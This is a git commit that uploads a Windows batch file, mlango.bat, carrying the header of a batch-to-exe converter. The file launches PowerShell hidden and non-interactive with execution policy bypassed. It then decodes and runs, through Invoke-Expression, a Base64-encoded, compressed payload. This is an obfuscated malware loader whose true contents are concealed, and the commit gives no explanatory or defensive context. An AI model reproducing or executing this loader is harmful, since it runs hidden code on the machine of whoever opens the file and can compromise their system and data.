b95b422d3e159d0d0a0704978ee5915238bf9140
fehdykpm <104258137+fehdykpm@users.noreply.github.com>
2022-05-12 19:28:19 +0000

    Add files via upload

---
+++ mlango.bat
@@ -0,0 +1,34 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbattAEH3XVwxCEAlLQr6kBIdAbrgNtG6IQ/tg/CCvJ/E2q12xO7Itp/73jhK5bUJaSh/EWe3OnHN2ZjYQcAKnvje9VOqqKI2l0H9Aq1H1e+lCKT+aQVnNlRTgKCcG3BCfw5Wma7LwRVqqcnWmlBFhu7eOoZKaYNNi3eI2Ov5vnQuLOeHtkmGx16la3lUMv5Tb1W/a7U6j7p96ZOvHwPGlx7hOPs+/oSCY1I6wSMdI6cSIByTXIoTTN87OFguLzo3yQqp6NhyyAFoOWBv7EMNbGc94W5fI4RPiSxRvB15bQ0YY1YbeijLyApdeGK3ZaHjQzdLuYe/p6x/EcJQdZRF8B1NRoiuljiEo+WrTM2vzxtlz1a40l1QLDP15TejHMIg4cMOBTH2DAuUKw6B8RbTl88wL6n/gm55LYosrtFyIxrbhkvR7zBlnUeewUaun2awh3JyPvPVSKoSQFRJFf0+O4LFx0nlptY6Dbecw7sZ/rvVI5feO2cZGYwQ7785YVpQnXfYiWRdh0Kw6HVZgc4Fs3O3pXjl6j3TOF3XhlCdqxkY+5HqhMOKspDvbeQFxLg9F0nQNkgKLOdpLvJNakjQaAgHJOC8Q/K9S93s+JJr/XJkLhKedUaVFE+kgKXPnaGmrpkEnAQ2HLx5YFgd1+hH1PS3jbNPPsoxhkEXe3vlNpUkWmD6NpCknaFdSoEs/5dYtc9W00JR1U0HIuG/PT2MWBpt0X/YoiuGnCA8f7bvevj1WjINN3MCr0ZtQbimZKMQSkgkKoxdw9G6QZTuRk1g+7n4A\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"
